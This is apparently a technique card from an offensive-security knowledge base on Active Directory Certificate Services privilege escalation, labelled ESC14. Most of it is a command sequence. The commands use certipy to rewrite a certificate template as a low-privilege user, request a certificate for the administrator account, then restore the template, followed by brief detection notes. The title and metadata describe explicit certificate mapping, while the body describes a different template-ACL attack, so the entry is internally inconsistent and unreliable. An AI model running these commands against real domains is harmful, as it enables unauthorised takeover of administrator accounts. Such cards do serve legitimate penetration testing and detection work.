---
id: adcs_esc14
type: technique
label: "AD CS ESC14 (explicit certificate mapping)"
phase: "privesc"
tools: ["certipy", "certify"]
cve: null
detect: "Audit altSecurityIdentities changes and correlate explicit mappings with certificate-based authentication."
mitre: "T1649"
tag: null
---


# AD CS ESC14 (explicit certificate mapping)

### Affected object / attribute
**Template ACEs** — `WriteProperty` on `msPKI-Certificate-Name-Flag`.

### Concept (deep)
Weak ACE patterns let an attacker **flip SAN supply** → chain into ESC1. Same **modify → exploit → restore** discipline.

### Commands
```bash
# ── Inspect template ACLs ────────────────────────────────────────────
Get-DomainObjectAcl -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -ResolveGUIDs

# ── Modify, exploit, restore (as ESC4) ───────────────────────────────
certipy template -u lowpriv@corp.local -p 'Password123!' \
  -template VulnTemplate -save-old
certipy req ... -template VulnTemplate -upn administrator@corp.local
certipy template -u lowpriv@corp.local -p 'Password123!' \
  -template VulnTemplate -restore
```

### Detection
**5136** on templates; baseline template ACLs.

---
